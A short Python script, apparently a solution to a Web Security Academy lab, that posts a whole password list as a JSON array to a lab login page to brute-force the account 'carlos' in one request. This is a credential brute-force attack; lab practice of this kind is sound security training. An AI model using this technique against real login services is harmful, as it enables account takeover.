import requests

url = "https://0af7004804fe44cb8166e318000a003c.web-security-academy.net/login"

with open("passwords.txt", "r") as f:
    credentials = [line.strip() for line in f.readlines()]

data = {"username": "carlos", "password": credentials}
requests.post(url, json=data)